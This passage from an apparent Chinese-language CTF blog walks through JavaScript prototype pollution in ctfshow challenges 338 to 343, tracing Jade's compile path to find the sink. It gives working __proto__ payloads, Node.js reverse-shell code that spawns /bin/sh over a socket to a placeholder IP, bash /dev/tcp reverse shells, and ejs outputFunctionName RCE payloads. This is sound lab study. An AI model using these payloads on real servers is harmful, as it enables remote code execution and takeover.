class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>哑火了，payload 并没有达到我们的预期，用 JavaScript 创建 o2 的过程（let o2 = {a: 1, “__proto__“: {b: 2}}）中，__proto__已经代表 o2 的原型了，我们的键值相当于自定义了一个原型对象，没法在新的对象中添加__proto__键值，此时遍历 o2 的所有键名，拿到的只是[a, b]，__proto__并不是一个 key，自然也不会修改 Object 的原型。</p><p>那么，如何让__proto__被认为是一个键名呢？用 JSON 解析一下键值对(JSON.parse 会把一个 json 字符串 转化为 javascript 的 object)，将代码改成如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?数组元素双引号<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>可见，新建的 o3 对象，也存在 b 属性，说明 Object 已经被污染，因为 JSON 解析下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍 o2 时会存在这个键</p><p>merge 操作时最常见的可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p><p>有哪些情况原型链会被污染？哪些情况原型链能被修改呢？哪些情况下我们可以设置__proto__的值呢？<br>其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><blockquote><p>存在影响目标类型的同型，该同型的参数可控</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E6%B1%A1%E6%9F%93.png"></p><p><strong>原型链污染</strong>利用的关键就是找到可以覆盖的属性或者方法。</p><p>这类漏洞的关键主要是在 compile 编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。</p><p>限制：</p><ul><li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li><li>被覆盖的属性无硬编码默认值</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>下载附件</p><blockquote><p>npm install</p><p>node bin/www</p></blockquote><p>index.js：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>login.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span>+JSON.stringify(user)&#125;);<br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>common.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>首页貌似没啥用，在 login.js 中看到 secert 没有 ctfshow 这个属性，而<code>secert.ctfshow===&#39;36dboy&#39;</code>就有 flag，我们发现 select 是一个数组，而 user 也是一个数组(具有同型)，而且通过<code>utils.copy(user,req.body)</code>传入数值(copy 和 merge 类比)，req.body 是 POST 请求(参数可控)</p><p>那么抓包传入即可</p><blockquote><p>{“__proto__“:{“ctfshow”:”36dboy”}}</p></blockquote><h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>和 338 不同的是 ctfshow===变量，我们可知最后的 32 位字符串就在这变量 flag，是不可预测的值；多了一个 api.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>然后我们污染点一样，仍然是</p><blockquote><p>let user = {};<br>utils.copy(user,req.body);</p></blockquote><p>触发点：</p><blockquote><p>res.render(‘api’, { query: Function(query)(query)});</p></blockquote><p>匿名函数，和 Code-Breaking Thejs 很相像</p><blockquote><p>Function(query)(query)这种匿名函数的写法，query 不再是传数值，而是传入执行代码，然后自执行。有点和 eval 类似，但这里更好的解释是 Function 对象</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>官方是这样定义的：<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p></blockquote><p>然后想法是通过 login.js 的 copy 污染到 api.js 的 query，反弹一个 shell</p><p>js 如何反弹 shell<a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//js原生socket建立连接</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//污染传入</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//拼接</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要对上面的代码”格式化“，payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入拼接完成的 payload，post 传至/login，接着访问/api 触发后无响应，检查发现隧道启动成功，但是没有任何连接</p><p>解释如下：</p><ul><li>Function 中 require 是模块内的，无法调用全局变量</li></ul><p><a href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211121223733792.png"></p><ul><li>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node 交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</li></ul><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122000430212.png"></p><p><a href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p><p>此处的匿名函数原型是通过<code>new Function()</code>创建而来的，也就是说等价于上面的截图情形，没法直接在<code>Function</code>中引入 <code>require</code></p><p>总结就是，使用的是 nodejs 搭建的服务，可以使用 require，但它无法在匿名函数内调用全局变量(http)，换一种写法</p><blockquote><p>var require = global.require || global.process.mainModule.constructor._load||global.process.mainModule.require</p></blockquote><p>同时对于这个问题，我们看到 nodejs 是面向服务器端的，它具有 require 关键字，但在浏览器的控制台是没有的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 就可以了</p><h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.Router()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span><br>    &#125;)()<br>  &#125;)()<br>  utils.copy(user.userinfo, req.body)<br>  <span class="hljs-keyword">if</span> (user.userinfo.isAdmin) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span> &#125;)<br>  &#125;<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure><p>这里面的 userinfo 原型不同了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122183340194.png"></p><p>再套一个<code>__proto__</code>即可</p><h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>这里介绍两个自动化找洞：</p><p>snyk 的使用</p><p>在官网注册登录，初次登录要关联 Github，找到 api，本地：</p><blockquote><p>npm install snyk -g</p><p>snyk config set api=</p><p>snyk test</p></blockquote><p>audit 的使用</p><blockquote><p>npm audit</p></blockquote><ul><li>ejs</li></ul><p>因为这题没有/api 触发点，使用 338 存在的 ejs RCE，因为是非预期没有放出来，使用 snyk 扫出来</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>还有一个入口 outputFunctionName：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到 login.js 的<code>this.userinfo = new function()&#123;...</code>所以上面的 payload 再嵌套一个<code>__proto__</code></p><h4 id="ctfshow342、343"><a href="#ctfshow342、343" class="headerlink" title="ctfshow342、343"></a>ctfshow342、343</h4><ul><li>jade</li></ul><p><a href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172124317.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172422442.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172602483.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172725768.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124173907879.png"></p><p>js 调试真的一坨坨的 Orz</p><p>this.engine 跟进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174739562.png"></p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174952093.png"></p><p>可见返回值处：</p><blockquote><p>return handleTemplateCache(options)(options);</p></blockquote><p>跟进一下 handleTemplateCache</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001447005.png"></p><p>跟一下 compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001503138.png"></p><p>先看一下 parse</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003052754.png"></p><p>parser 内，tokens 被内部 parse 后传到 compiler 被 compile，赋为 js 的值，js 被部分传入 body 内</p><p>看一下 compile，它是 compiler 的函数，去 node_module 找</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003818514.png"></p><p>返回 buf 传回 compile</p><p>跟进 66 行 this.visit(this.node);<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082102153.png"></p><p>this.debug=true 时 node.filename 被 stringify 转换为字符串 node.line 随着被 push 进 buf</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082655288.png"></p><p>this.visitNode(node);遍历 ast 树后回到 compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084259360.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084511998.png"></p><p>node.line 被记录到 fn 中，然后</p><blockquote><p>fn = new Function(‘locals, jade’, fn);</p></blockquote><p>那么我们的污染点就出来了，<strong>污染到 node.line 就可以运行代码了</strong></p><h5 id="碰到问题"><a href="#碰到问题" class="headerlink" title="碰到问题"></a>碰到问题</h5><p>post /login</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 